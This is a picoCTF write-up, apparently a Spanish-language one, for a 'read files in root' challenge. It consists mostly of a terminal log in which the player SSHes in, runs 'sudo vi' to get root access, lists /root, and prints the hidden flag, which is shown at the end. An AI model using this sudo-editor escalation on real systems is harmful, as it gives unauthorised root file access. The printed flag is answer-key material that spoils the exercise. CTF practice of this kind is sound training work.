#### Description

Can you read files in the root file?

Additional details will be available after launching your challenge instance.

#### Hints 

What permissions do you have?

# Solución

```

alestd-picoctf@webshell:~$ ssh -p 65147 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:65147 ([13.59.203.175]:65147)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:65147' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ ls
picoplayer@challenge:~$ cd /
picoplayer@challenge:/$ ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
picoplayer@challenge:/$ sudo vi
[sudo] password for picoplayer: 


Press ENTER or type command to continue
picoplayer@challenge:/$ 
picoplayer@challenge:/$ sudo vi


Press ENTER or type command to continue
[1]+  Stopped                 sudo vi
picoplayer@challenge:/$ sudo vi


Press ENTER or type command to continue
[2]+  Stopped                 sudo vi
picoplayer@challenge:/$ sudo vi

[3]+  Stopped                 sudo vi
picoplayer@challenge:/$ sudo vi


Press ENTER or type command to continue
total 16
drwx------ 1 root root   22 Mar 13 19:38 .
drwxr-xr-x 1 root root   63 Mar 13 19:35 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  599 Mar 13 19:38 .viminfo

Press ENTER or type command to continue
cat: /root/flag.txt: No such file or directory

shell returned 1

Press ENTER or type command to continue
cat: /root/flag.txt: No such file or directory

shell returned 1

Press ENTER or type command to continue
cat: /flag.txt: No such file or directory

shell returned 1

Press ENTER or type command to continue

Press ENTER or type command to continue
[4]+  Stopped                 sudo vi
picoplayer@challenge:/$ sudo vi


Press ENTER or type command to continue
total 16
drwx------ 1 root root   22 Mar 13 19:38 .
drwxr-xr-x 1 root root   63 Mar 13 19:35 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  599 Mar 13 19:38 .viminfo

Press ENTER or type command to continue
picoCTF{uS1ng_v1m_3dit0r_021d10ab}

```